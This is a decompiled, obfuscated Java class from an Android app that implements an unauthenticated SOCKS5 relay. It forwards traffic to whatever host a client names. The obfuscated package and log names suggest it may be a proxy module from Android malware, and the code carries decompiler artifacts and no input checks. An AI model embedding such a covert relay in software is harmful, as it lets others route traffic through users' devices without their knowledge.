package wocwvy.czyxoxmbauu.slsa.kuv;

import android.util.Log;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

/* renamed from: wocwvy.czyxoxmbauu.slsa.kuv.a */
public class C0043a implements Runnable {

    /* renamed from: a */
    private Socket f433a;

    /* renamed from: b */
    private String f434b = getClass().getName();

    /* renamed from: c */
    private int f435c = 102400;

    public C0043a(Socket socket) {
        this.f433a = socket;
    }

    /* renamed from: a */
    public int mo287a(byte b) {
        return b & 255;
    }

    public void run() {
        try {
            InputStream inputStream = this.f433a.getInputStream();
            OutputStream outputStream = this.f433a.getOutputStream();
            byte[] bArr = new byte[this.f435c];
            inputStream.read(bArr, 0, 3);
            outputStream.write(new byte[]{5, 0});
            outputStream.flush();
            inputStream.read(bArr, 0, 10);
            StringBuilder sb = new StringBuilder();
            sb.append(mo287a(bArr[4]));
            sb.append(".");
            sb.append(mo287a(bArr[5]));
            sb.append(".");
            sb.append(mo287a(bArr[6]));
            sb.append(".");
            sb.append(mo287a(bArr[7]));
            String sb2 = sb.toString();
            int a = (mo287a(bArr[8]) * 256) + mo287a(bArr[9]);
            StringBuilder sb3 = new StringBuilder();
            sb3.append("Connected to ");
            sb3.append(sb2);
            sb3.append(":");
            sb3.append(a);
            Log.e("viwbhhtpqlxexwwm", sb3.toString());
            Socket socket = new Socket(sb2, a);
            InputStream inputStream2 = socket.getInputStream();
            OutputStream outputStream2 = socket.getOutputStream();
            byte[] bArr2 = new byte[4];
            byte[] address = socket.getLocalAddress().getAddress();
            int localPort = socket.getLocalPort();
            outputStream.write(new byte[]{5, 0, 0, 1, address[0], address[1], address[2], address[3], (byte) (localPort >> 8), (byte) (localPort & 255)}, 0, 10);
            outputStream.flush();
            new C0044b(inputStream2, outputStream).start();
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            while (true) {
                int read = inputStream.read(bArr, 0, this.f435c);
                if (read > 0) {
                    outputStream2.write(bArr, 0, read);
                    byteArrayOutputStream.write(bArr, 0, read);
                    outputStream2.flush();
                } else {
                    try {
                        break;
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
            if (this.f433a != null) {
                this.f433a.close();
            }
        } catch (Exception e2) {
            e2.printStackTrace();
            if (this.f433a != null) {
                this.f433a.close();
            }
        } catch (Throwable th) {
            Throwable th2 = th;
            try {
                if (this.f433a != null) {
                    this.f433a.close();
                }
            } catch (IOException e3) {
                e3.printStackTrace();
            }
            throw th2;
        }
    }
}
